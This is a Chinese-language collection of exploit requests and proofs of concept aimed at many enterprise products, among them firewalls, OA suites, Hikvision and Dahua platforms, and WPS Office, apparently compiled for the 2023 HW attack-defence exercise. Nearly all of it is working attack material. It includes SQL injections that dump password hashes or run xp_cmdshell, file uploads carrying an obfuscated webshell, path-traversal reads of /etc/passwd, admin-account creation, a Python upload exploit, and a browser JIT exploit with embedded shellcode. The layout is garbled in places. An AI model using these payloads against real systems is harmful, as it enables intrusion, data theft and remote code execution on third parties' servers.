# ⼀、2023HW漏洞POC、EXP

## 1、网神 SecSSL 3600安全接入网关系统 任意密码修改漏洞

```
1 POST /changepass.php?type=2 
2
3 Cookie: admin_id=1; gw_user_ticket=ffffffffffffffffffffffffffffffff; last_step_p
4 old_pass=&password=Test123!@&repassword=Test123!@
```

## 2、网神 SecGate 3600 防⽕墙 obj_app_upfile 任意⽂件上传漏洞

```
1 POST /?g=obj_app_upfile HTTP/1.1
2 Host: x.x.x.x
3 Accept: /
4 Accept-Encoding: gzip, deflate
5 Content-Length: 574
6 Content-Type: multipart/form-data; boundary=----
  WebKitFormBoundaryJpMyThWnAxbcBBQc
7 User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)
8
9 ------WebKitFormBoundaryJpMyThWnAxbcBBQc
10 Content-Disposition: form-data; name="MAX_FILE_SIZE"
11
12 10000000
13 ------WebKitFormBoundaryJpMyThWnAxbcBBQc
14 Content-Disposition: form-data; name="upfile"; filename="vulntest.php"
15 Content-Type: text/plain
16
17 <?php php⻢?>
18
19 ------WebKitFormBoundaryJpMyThWnAxbcBBQc
20 Content-Disposition: form-data; name="submit_post"
21
22 obj_app_upfile
23 ------WebKitFormBoundaryJpMyThWnAxbcBBQc
24 Content-Disposition: form-data; name="__hash__"
25
26 0b9d6b1ab7479ab69d9f71b05e0e9445
27 ------WebKitFormBoundaryJpMyThWnAxbcBBQc--
```

⻢⼉路径： attachements/xxx.php

## 3、某达OA sql注⼊漏洞 CVE-2023-4166

```
1 GET /general/system/seal_manage/dianju/delete_log.php?
DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count
(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20a
nd(1)=(1 HTTP/1.1
2 Host: 127.0.0.1:8080
3 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 
Firefox/116.04 Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*
;q=0.8
5 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
6 Accept-Encoding: gzip, deflate
7 Connection: close
8 Upgrade-Insecure-Requests: 1
```



1. 某达OA sql注⼊漏洞 CVE-2023-4165 POC
  1 GET /general/system/seal_manage/iweboffice/delete_seal.php?
  DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count
  (*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20a
  nd(1)=(1 HTTP/1.1
  2 Host: 127.0.0.1:8080
  3 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 
  Firefox/116.0
  4 Accept: 
  text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*
  ;q=0.8
  5 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
  6 Accept-Encoding: gzip, deflate
  7 Connection: close
  8 Upgrade-Insecure-Requests: 1
2. 某联达oa sql注⼊漏洞 POC
  1 POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1
  2 Host: xxx.com
  3 Upgrade-Insecure-Requests: 1
  4 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 
  (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
  5 Accept: text/html,application/xhtml 
  xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,applicatio
  n/signed-exchange;v=b3;q=0.76 Referer: http://xxx.com:8888/Services/Identification/Server/Incompatible.aspx
  7 Accept-Encoding: gzip, deflate
  8 Accept-Language: zh-CN,zh;q=0.9
  9 Cookie: 
  10 Connection: close
  11 Content-Type: application/x-www-form-urlencoded
  12 Content-Length: 88
  13
  14 dasdas=&key=1' UNION ALL SELECT top 1812 concat(F_CODE,':',F_PWD_MD5) from 
  T_ORG_USER --
3. 某服 sxf-报表系统 版本有限制
  POC
  1 POST /rep/login HTTP/1.1 
  2 Host: URL
  3 Cookie: 
  4 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac 0s X 10.15: 
  ry:109.0)Gecko/20100101 Firefox/115.0 
  5 Accept:text/html,application/xhtml+xml,application/xml;g=0,9, image/avif, 
  image/webp,*/*;q=0.8 Accept-Language:zh-CN, zh;g=0.8, zh-TW;g=0.7, zh￾HK;g=0.5,en-US;g=0.3,en;g=0.2 
  6 Accept-Encoding: gzip deflate 
  7 Upgrade-Insecure-Requests: 1 
  8 Sec-Fetch-Dest: document 
  9 Sec-Fetch-Mode: navigate 
  10 Sec-Fetch-Site: cross-site Pragma: no-cache Cache-Control: no-cache14 Te: 
  trailers 
  11 Connection: close 
  12 Content-Type:application/x-www-form-urlencoded 
  13 Content-Length: 126 
  clsMode=cls_mode_login&index=index&log_type=report&page=login&rnd=0.75501034664
  97915&userID=admin%0Aid -a %0A&userPsw=tmbhuisq
4. 某盟sas安全审计系统任意⽂件读取漏洞POC/webconf/GetFile/index?
  path=../../../../../../../../../../../../../../etc/passwd
5. 某凌OA前台代码执⾏
  POC
  github的exp（21年的洞)：
  https://github.com/wushigudan/poc/blob/main/ll%E8%93%9D%E5%87%8C0A.py
  1 POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
  2 Host: xxxx
  3 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
  4 Accept: /
  5 Connection: Keep-Alive
  6 Content-Length: 42
  7 Content-Type: application/x-www-form-urlencoded
  8
  9 var={"body":{"file":"file:///etc/passwd"}}9. ⾦⼭WPS RCE
  wps影响范围为：WPS Office 2023 个⼈版 < 11.1.0.15120
  WPS Office 2019 企业版 < 11.8.2.12085
  POC
  在1.html当前路径下启动http server并监听80端⼝，修改hosts⽂件（测试写死的）
  127.0.0.1 clientweb.docer.wps.cn.cloudwps.cn漏洞触发需让域名规则满⾜clientweb.docer.wps.cn.{xxxxx}wps.cn cloudwps.cn和wps.cn没有任何
  关系
  代码块在底下。（需要原pdf加wechat）

  ```
  1 <script>
  2 if(typeof alert === "undefined"){
  3 alert = console.log;
  4 }
  5 let f64 = new Float64Array(1);
  6 let u32 = new Uint32Array(f64.buffer);
  7 function d2u(v) {
  8 f64[0] = v;
  9 return u32;
  10 }
  11 function u2d(lo, hi) {
  12 u32[0] = lo;
  13 u32[1] = hi;
  14 return f64[0];
  15 }
  16 function gc(){ // major
  17 for (let i = 0; i < 0x10; i++) {
  18 new Array(0x100000);
  19 }
  20 }
  21 function foo(bug) {
  22 function C(z) {
  23 Error.prepareStackTrace = function(t, B) {
  24 return B[z].getThis();
  25 };
  26 let p = Error().stack;
  27 Error.prepareStackTrace = null;
  28 return p;
  29 }
  30 function J() {}
  31 var optim = false;
  32 var opt = new Function(
  33 'a', 'b', 'c',
  34 'if(typeof a===\'number\'){if(a>2){for(var
  35 i=0;i<100;i++);return;}b.d(a,b,1);return}' +
  36 'g++;'.repeat(70));
  37 var e = null;
  38 J.prototype.d = new Function(
  39 'a', 'b', '"use strict";b.a.call(arguments,b);return arguments[a];');
  40 J.prototype.a = new Function('a', 'a.b(0,a)');41 J.prototype.b = new Function(
  42 'a', 'b',
  43 'b.c();if(a){' +
  44 'g++;'.repeat(70) + '}');
  45 J.prototype.c = function() {
  46 if (optim) {
  47 var z = C(3);
  48 var p = C(3);
  49 z[0] = 0;
  50 e = {M: z, C: p};
  51 }
  52 };
  53 var a = new J();
  54 // jit optim
  55 if (bug) {
  56 for (var V = 0; 1E4 > V; V++) {
  57 opt(0 == V % 4 ? 1 : 4, a, 1);
  58 }
  59 }
  60 optim = true;
  61 opt(1, a, 1);
  62 return e;
  63 }
  64 e1 = foo(false);
  65 e2 = foo(true);
  66 delete e2.M[0];
  67 let hole = e2.C[0];
  68 let map = new Map();
  69 map.set('asd', 8);
  70 map.set(hole, 0x8);
  71 map.delete(hole);
  72 map.delete(hole);
  73 map.delete("asd");
  74 map.set(0x20, "aaaa");
  75 let arr3 = new Array(0);
  76 let arr4 = new Array(0);
  77 let arr5 = new Array(1);
  78 let oob_array = [];
  79 oob_array.push(1.1);
  80 map.set("1", -1);
  81 let obj_array = {
  82 m: 1337, target: gc
  83 };
  84 let ab = new ArrayBuffer(1337);
  85 let object_idx = undefined;
  86 let object_idx_flag = undefined;
  87 let max_size = 0x1000;88 for (let i = 0; i < max_size; i++) {
  89 if (d2u(oob_array[i])[0] === 0xa72) {
  90 object_idx = i;
  91 object_idx_flag = 1;
  92 break;
  93 }if (d2u(oob_array[i])[1] === 0xa72) {
  94 object_idx = i + 1;
  95 object_idx_flag = 0;
  96 break;
  97 }
  98 }
  99 function addrof(obj_para) {
  100 obj_array.target = obj_para;
  101 let addr = d2u(oob_array[object_idx])[object_idx_flag] - 1;
  102 obj_array.target = gc;
  103 return addr;
  104 }
  105 function fakeobj(addr) {
  106 let r8 = d2u(oob_array[object_idx]);
  107 if (object_idx_flag === 0) {
  108 oob_array[object_idx] = u2d(addr, r8[1]);
  109 }else {
  110 oob_array[object_idx] = u2d(r8[0], addr);
  111 }
  112 return obj_array.target;
  113 }
  114 let bk_idx = undefined;
  115 let bk_idx_flag = undefined;
  116 for (let i = 0; i < max_size; i++) {
  117 if (d2u(oob_array[i])[0] === 1337) {
  118 bk_idx = i;
  119 bk_idx_flag = 1;
  120 break;
  121 }if (d2u(oob_array[i])[1] === 1337) {
  122 bk_idx = i + 1;
  123 bk_idx_flag = 0;
  124 break;
  125 }
  126 }
  127 let dv = new DataView(ab);
  128 function get_32(addr) {
  129 let r8 = d2u(oob_array[bk_idx]);
  130 if (bk_idx_flag === 0) {
  131 oob_array[bk_idx] = u2d(addr, r8[1]);
  132 } else {
  133 oob_array[bk_idx] = u2d(r8[0], addr);
  134 }135 let val = dv.getUint32(0, true);
  136 oob_array[bk_idx] = u2d(r8[0], r8[1]);
  137 return val;
  138 }
  139 function set_32(addr, val) {
  140 let r8 = d2u(oob_array[bk_idx]);
  141 if (bk_idx_flag === 0) {
  142 oob_array[bk_idx] = u2d(addr, r8[1]);
  143 } else {
  144 oob_array[bk_idx] = u2d(r8[0], addr);
  145 }
  146 dv.setUint32(0, val, true);
  147 oob_array[bk_idx] = u2d(r8[0], r8[1]);
  148 }
  149 function write8(addr, val) {
  150 let r8 = d2u(oob_array[bk_idx]);
  151 if (bk_idx_flag === 0) {
  152 oob_array[bk_idx] = u2d(addr, r8[1]);
  153 } else {
  154 oob_array[bk_idx] = u2d(r8[0], addr);
  155 }
  156 dv.setUint8(0, val);
  157 }
  158 let fake_length = get_32(addrof(oob_array)+12);
  159 set_32(get_32(addrof(oob_array)+8)+4,fake_length);
  160 let wasm_code = new
  161 Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,
  162 128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,
  163 128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0
  164 ,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
  165 let wasm_mod = new WebAssembly.Module(wasm_code);
  166 let wasm_instance = new WebAssembly.Instance(wasm_mod);
  167 let f = wasm_instance.exports.main;
  168 let target_addr = addrof(wasm_instance)+0x40;
  169 let rwx_mem = get_32(target_addr);
  170 //alert("rwx_mem is"+rwx_mem.toString(16));
  171 const shellcode = new Uint8Array([0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89
  172 0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30,0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14,
  173 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff,0xac, 0x3c, 0x61, 0x7c,
  174 0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2, 0x52,0x57, 0x8b,
  175 0x52, 0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48, 0x01,
  176 0xd1,0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49,
  177 0x8b, 0x34, 0x8b,0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7,
  178 0x38, 0xe0, 0x75, 0xf6, 0x03,0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe4, 0x58,
  179 0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b,0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01,
  180 0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24,0x24, 0x5b, 0x5b, 0x61,
  181 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a, 0x8b, 0x12, 0xeb,0x8d, 0x5d,182 0x6a, 0x01, 0x8d, 0x85, 0xb2, 0x00, 0x00, 0x00, 0x50, 0x68, 0x31, 0x8b,
  183 0x6f,0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x68, 0xa6, 0x95, 0xbd,
  184 0x9d, 0xff, 0xd5,0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
  185 0x47, 0x13, 0x72, 0x6f, 0x6a,0x00, 0x53, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63,
  186 0x00]);
  187 for(let i=0;i<shellcode.length;i++){
  188 write8(rwx_mem+i,shellcode[i]);
  189 }
  190 f();
  191 </script>
  ```

  
6. 汉得SRM tomcat.jsp 登录绕过漏洞 POC
   1 /tomcat.jsp?dataName=role_id&dataValue=1
   1 /tomcat.jsp?dataName=user_id&dataValue=1
   然后访问后台： /main.screen
7. 某联达oa 后台⽂件上传漏洞 POC
   1 POST /gtp/im/services/group/msgbroadcastuploadfile.aspx HTTP/1.1
   2 Host: 10.10.10.1:8888
   3 X-Requested-With: Ext.basex
   4 Accept: text/html, application/xhtml+xml, image/jxr, /
   5 Accept-Language: zh-Hans-CN,zh-Hans;q=0.5
   6 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 
   (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
   7 Accept-Encoding: gzip, deflate
   8 Content-Type: multipart/form-data; boundary=----
   WebKitFormBoundaryFfJZ4PlAZBixjELj
   9 Accept: /10 Origin: http://10.10.10.1
   11 Referer: http://10.10.10.1:8888/Workflow/Workflow.aspx?configID=774d99d7-02bf-
   42ec-9e27-
   caeaa699f512&menuitemid=120743&frame=1&modulecode=GTP.Workflow.TaskCenterModule
   &tabID=40
   12 Cookie: 
   13 Connection: close
   14 Content-Length: 421
   15
   16 ------WebKitFormBoundaryFfJZ4PlAZBixjELj
   17 Content-Disposition: form-data; filename="1.aspx";filename="1.jpg"
   18 Content-Type: application/text
   19
   20 <%@ Page Language="Jscript" Debug=true%>
   21 <%
   22 var FRWT='XeKBdPAOslypgVhLxcIUNFmStvYbnJGuwEarqkifjTHZQzCoRMWD';
   23 var GFMA=Request.Form("qmq1");
   24 var ONOQ=FRWT(19) + FRWT(20) + FRWT(8) + FRWT(6) + FRWT(21) + FRWT(1);
   25 eval(GFMA, ONOQ);
   26 %>
   27
   28 ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
8. 某联达oa sql注⼊漏洞 POC
   1 POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1
   2 Host: xxx.com
   3 Upgrade-Insecure-Requests: 1
   4 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 
   (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
   5 Accept: text/html,application/xhtml 
   xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,applicatio
   n/signed-exchange;v=b3;q=0.7
   6 Referer: http://xxx.com:8888/Services/Identification/Server/Incompatible.aspx
   7 Accept-Encoding: gzip, deflate
   8 Accept-Language: zh-CN,zh;q=0.9
   9 Cookie: 
   10 Connection: close
   11 Content-Type: application/x-www-form-urlencoded
   12 Content-Length: 88
   1314 dasdas=&key=1' UNION ALL SELECT top 1812 concat(F_CODE,':',F_PWD_MD5) from 
   T_ORG_USER --
9. 某微E-Office9⽂件上传漏洞 CVE-2023-2648 POC
   1 POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
   2 Host: 192.168.233.10:8082
   3 User-Agent: test
   4 Connection: close
   5 Content-Length: 493
   6 Accept-Encoding: gzip
   7 Content-Type: multipart/form-data
   8
   9 ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
   10 Content-Disposition: form-data; name="Filedata"; filename="666.php"
   11 Content-Type: application/octet-stream
   12
   13 <?php phpinfo();?>
   14
   15 ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
10. 某微E-Office9⽂件上传漏洞 CVE-2023-2523 POC
    1 POST/E-mobile/App/Ajax/ajax.php?action=mobile_upload_save HTTP/1.1 
    2 Host:192.168.233.10:8082 
    3 Cache-Control:max-age=0 
    4 Upgrade-Insecure-Requests:1 
    5 Origin:null 
    6 Content-Type:multipart/form-data; boundary=----
    WebKitFormBoundarydRVCGWq4Cx3Sq6tt 
    7 Accept-Encoding:gzip, deflate
    8 Accept-Language:en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
    9 Connection:close
    10
    11 ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt12 Content-Disposition:form-data; name="upload_quwan"; filename="1.php."
    13 Content-Type:image/jpeg
    14 <?phpphpinfo();?>
    15 ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt15. 某信景云终端安全管理系统 login SQL注⼊漏洞 POC
    1 POST /api/user/login
    2
    3 captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*fr
    om(select+sleep(3))a)='
11. 某恒明御运维审计与⻛险控制系统堡垒机任意⽤⼾注册
    1 POST /service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc 
    HTTP/1.1
    2 Host: xxx
    3 Cookie: LANG=zh; 
    USM=0a0e1f29d69f4b9185430328b44ad990832935dbf1b90b8769d297dd9f0eb848
    4 Cache-Control: max-age=0
    5 Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="100", "Google 
    Chrome";v="100"
    6 Sec-Ch-Ua-Mobile: ?0
    7 Sec-Ch-Ua-Platform: "Windows"
    8 Upgrade-Insecure-Requests: 19 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 
    (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
    10 Accept: 
    text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,
    image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    11 Sec-Fetch-Site: none
    12 Sec-Fetch-Mode: navigate
    13 Sec-Fetch-User: ?1
    14 Sec-Fetch-Dest: document
    15 Accept-Encoding: gzip, deflate
    16 Accept-Language: zh-CN,zh;q=0.9
    17 Connection: close
    18 Content-Length: 1121
    19
    20 <?xml version="1.0"?>
    21 <methodCall>
    22 <methodName>web.user_add</methodName>
    23 <params>
    24 <param>
    25 <value>
    26 <array>
    27 <data>
    28 <value>
    29 <string>admin</string>
    30 </value>
    31 <value>
    32 <string>5</string>
    33 </value>
    34 <value>
    35 <string>XX.XX.XX.XX</string>
    36 </value>
    37 </data>
    38 </array>
    39 </value>
    40 </param>
    41 <param>
    42 <value>
    43 <struct>
    44 <member>
    45 <name>uname</name>
    46 <value>
    47 <string>deptadmin</string>
    48 </value>
    49 </member>
    50 <member>
    51 <name>name</name>
    52 <value>53 <string>deptadmin</string>
    54 </value>
    55 </member>
    56 <member>
    57 <name>pwd</name>
    58 <value>
    59 <string>Deptadmin@123</string>
    60 </value>
    61 </member>
    62 <member>
    63 <name>authmode</name>
    64 <value>
    65 <string>1</string>
    66 </value>
    67 </member>
    68 <member>
    69 <name>deptid</name>
    70 <value>
    71 <string></string>
    72 </value>
    73 </member>
    74 <member>
    75 <name>email</name>
    76 <value>
    77 <string></string>
    78 </value>
    79 </member>
    80 <member>
    81 <name>mobile</name>
    82 <value>
    83 <string></string>
    84 </value>
    85 </member>
    86 <member>
    87 <name>comment</name>
    88 <value>
    89 <string></string>
    90 </value>
    91 </member>
    92 <member>
    93 <name>roleid</name>
    94 <value>
    95 <string>101</string>
    96 </value>
    97 </member>
    98 </struct></value>
    99 </param>100 </params>
    101 </methodCall>
12. HiKVISION 综合安防管理平台 report 任意⽂件上传漏洞 POC
    fofa查询语句
    icon_hash=“-808437027” app=“HIKVISION-iSecure-Center”
    EXP/POC：payload.py 脚本 ⾛127.0.0.1:8080 代理，⽅便burpsuit抓包。
    1 #!usr/bin/env python
    2 # - coding:utf-8 *-*
    3 import sys
    4 import requests
    5 import string
    6 import random
    7 import urllib3
    8 urllib3.disable_warnings()
    9
    10 proxies = {
    11 'http': 'http://127.0.0.1:8080', 
    12 'https': 'http://127.0.0.1:8080', #127.0.0.1:8080 代理，⽅便burpsuit抓包
    13 }
    14
    15 def run(arg):
    16 try:
    17 flag=''.join(random.choices(string.ascii_uppercase + string.digits, k 
    = 9))
    18 filename=''.join(random.choices(string.ascii_uppercase + 
    string.digits, k = 10))
    19 vuln_url=arg+"center/api/files;.js"
    20 headers={'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 
    6.1)',
    21 'Accept': '*/*',
    22 'Content-Type': 'application/x-www-form-urlencoded'}
    23 file = {'file': (f'../../../../../bin/tomcat/apache￾tomcat/webapps/clusterMgr/{filename}.txt', flag, 'application/octet-stream')}
    24 r = requests.post(vuln_url, files=file, timeout=15, verify=False, 
    proxies=proxies)
    25 if r.status_code==200 and "webapps/clusterMgr" in r.text:26
    27 payload=f"clusterMgr/{filename}.txt;.js"
    28 url=arg+payload
    29 r2 = requests.get(url, timeout=15, verify=False, proxies=proxies)
    30 if r2.status_code==200 and flag in r2.text:
    31
    32 print('\033[1;31;40m')
    33 print(arg+f":存在海康威视isecure center 综合安防管理平台存在任意⽂件
    上传漏洞\nshell地址：{url}")
    34 print('\033[0m')
    35
    36
    37
    38 else:
    39 print(arg+":不存在漏洞")
    40 except:
    41 print(arg+":不存在漏洞")
    42
    43
    44 if name == '__main__':
    45 url=sys.argv[1]
    46 run(url)
    burpsuit抓包分析
    burpsuit 127.0.0.1:8080抓包，抓取post 包⼀个，get 请求包⼀个。 payload：请求数据包
    1
    2 POST /center/api/files;.js HTTP/1.1
    3 Host: x.x.x.x
    4 User-Agent: python-requests/2.31.0
    5 Accept-Encoding: gzip, deflate
    6 Accept: */*
    7 Connection: close
    8 Content-Length: 258
    9 Content-Type: multipart/form-data; boundary=e54e7e5834c8c50e92189959fe7227a4
    10
    11 --e54e7e5834c8c50e92189959fe7227a4
    12 Content-Disposition: form-data; name="file"; 
    filename="../../../../../bin/tomcat/apache￾tomcat/webapps/clusterMgr/2BT5AV96QW.txt"
    13 Content-Type: application/octet-stream
    14
    15 9YPQ3I3ZS
    16 --e54e7e5834c8c50e92189959fe7227a4--payload的返回数据包。
    1 HTTP/1.1 200 
    2 Server: openresty/1.13.6.2
    3 Date: Fri, 14 Jul 2023 04:35:23 GMT
    4 Content-Type: application/json;charset=UTF-8
    5 Content-Length: 335
    6 Connection: close
    7 Set-Cookie: JSESSIONID=0A235873FB1C02C345345C0D36A4C709; Path=/center; HttpOnly
    8 Content-Language: en_US
    9 Cache-Control: no-cache, no-store, must-revalidate
    10 Pragma: no-cache
    11 Expires: 0
    12 Content-Disposition: inline;filename=f.txt
    13
    14 {"code":"0","data":{"filename":"../../../../../bin/tomcat/apache￾tomcat/webapps/clusterMgr/
    访问漏洞链接：https://x.x.x.x/clusterMgr/2BT5AV96QW.txt;.js ，查看是否上传成功。
    因为Hikvision平台使⽤的中间件为tomcat，修改报⽂和⽂件名，所以实现上传哥斯拉⽣成jsp。 宿主
    服务器windows和linux都可使⽤。windows 拿到的账⼾是system账⼾，linux为root。 Hikvison账⼾
    管理密码的后渗透操作：海康威视综合安防后渗透利⽤技巧
    POC2
    1 POST /center/api/files;.html HTTP/1.1
    2 Host: 10.10.10.10
    3 Content-Type: multipart/form-data; boundary=----
    WebKitFormBoundary9PggsiM755PLa54a
    4
    5 ------WebKitFormBoundary9PggsiM755PLa54a
    6 Content-Disposition: form-data; name="file"; 
    filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat8
    5linux64.1/webapps/eportal/new.jsp"
    7 Content-Type: application/zip
    8
    9 <%jsp的⻢%>
    10 ------WebKitFormBoundary9PggsiM755PLa54a--
    report 任意⽂件上传漏洞1 POST /svm/api/external/report HTTP/1.1
    2 Host: 10.10.10.10
    3 Content-Type: multipart/form-data; boundary=----
    WebKitFormBoundary9PggsiM755PLa54a
    4
    5 ------WebKitFormBoundary9PggsiM755PLa54a
    6 Content-Disposition: form-data; name="file"; 
    filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat8
    5linux64.1/webapps/eportal/new.jsp"
    7 Content-Type: application/zip
    8
    9 <%jsp的⻢%>
    10
    11 ------WebKitFormBoundary9PggsiM755PLa54a--
    ⻢⼉路径： /portal/ui/login/..;/..;/new.jsp
13. HiKVISION 综合安防管理平台 files 任意⽂件上传漏洞 POC
    1 POST /center/api/files;.html HTTP/1.1
    2 Host: 10.10.10.10
    3 Content-Type: multipart/form-data; boundary=----
    WebKitFormBoundary9PggsiM755PLa54a
    4
    5 ------WebKitFormBoundary9PggsiM755PLa54a
    6 Content-Disposition: form-data; name="file"; 
    filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat8
    5linux64.1/webapps/eportal/new.jsp"
    7 Content-Type: application/zip
    8
    9 <%jsp的⻢%>
    10 ------WebKitFormBoundary9PggsiM755PLa54a--
14. Exchange Server远程代码执⾏漏洞（CVE-2023-38182）⻛险通告
    待补充poc exp描述和影响范围
    Exchange Server 2019 Cumulative Update 13
    Exchange Server 2019 Cumulative Update 12
    Exchange Server 2019 Cumulative Update 11
    Exchange Server 2016 Cumulative Update 23
    需要有普通⽤⼾权限
15. Coremail远程代码执⾏漏洞（官⽅已辟谣）
16. 某微 E-Cology 某版本 SQL注⼊漏洞 POC
    1 POST /dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr HTTP/1.1
    2 Host: ip:port 
    3 User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like 
    Gecko) Chrome/35.0.2117.157 Safari/537.36
    4 Connection: close 
    5
    6 Content-Length: 189
    7 Content-Type: text/plain
    8 Accept-Encoding: gzip
    9
    10 callCount=1
    11 page=
    12 httpSessionId=
    13 scriptSessionId=
    14 c0-scriptName=DocDwrUtil
    15 c0-methodName=ifNewsCheckOutByCurrentUser
    16 c0-id=0
    17 c0-param0=string:1 AND 1=1
    18 c0-param1=string:1
    19 batchId=0
17. 某和OA C6-GetSqlData.aspx SQL注⼊漏洞 POC
    1 POST /C6/Control/GetSqlData.aspx/.ashx
    2 Host: ip:port 
    3 User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like 
    Gecko) Chrome/35.0.2117.157 Safari/537.36
    4 Connection: close
    5 Content-Length: 189
    6 Content-Type: text/plain
    7 Accept-Encoding: gzip
    8
    9 exec master..xp_cmdshell 'ipconfig'
18. ⼤华智慧园区综合管理平台 searchJson SQL注⼊漏洞 POC
    1 GET 
    /portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22order
    By%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(388609)),0x7e),1)--
    %22%7D/extend/%7B%7D HTTP/1.1
    2 Host: 127.0.0.1:7443
    3 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) 
    AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
    4 Accept-Encoding: gzip, deflate
    5 Connection: close
19. ⼤华智慧园区综合管理平台 ⽂件上传漏洞 POC
    1 POST /publishing/publishing/material/file/video HTTP/1.1
    2 Host: 127.0.0.1:7443
    3 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) 
    AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.154 Content-Length: 804
    5 Content-Type: multipart/form-data; boundary=dd8f988919484abab3816881c55272a7
    6 Accept-Encoding: gzip, deflate
    7 Connection: close
    8
    9 --dd8f988919484abab3816881c55272a7
    10 Content-Disposition: form-data; name="Filedata"; 
    filename="0EaE10E7dF5F10C2.jsp"
    11
    12 <%@page contentType="text/html; charset=GBK"%><%@page 
    import="java.math.BigInteger"%><%@page import="java.security.MessageDigest"%>
    <% MessageDigest md5 = null;md5 = MessageDigest.getInstance("MD5");String s = 
    "123456";String miyao = "";String jiamichuan = s + 
    miyao;md5.update(jiamichuan.getBytes());String md5String = new BigInteger(1, 
    md5.digest()).toString(16);out.println(md5String);new 
    java.io.File(application.getRealPath(request.getServletPath())).delete();%>
    13 --dd8f988919484abab3816881c55272a7
    14 Content-Disposition: form-data; name="poc"
    15
    16 poc
    17 --dd8f988919484abab3816881c55272a7
    18 Content-Disposition: form-data; name="Submit"
    19
    20 submit
    21 --dd8f988919484abab3816881c55272a7--
20. ⽤友时空KSOA PayBill SQL注⼊漏洞 POC
    1 POST /servlet/PayBill?caculate&_rnd= HTTP/1.1
    2 Host: 1.1.1.1
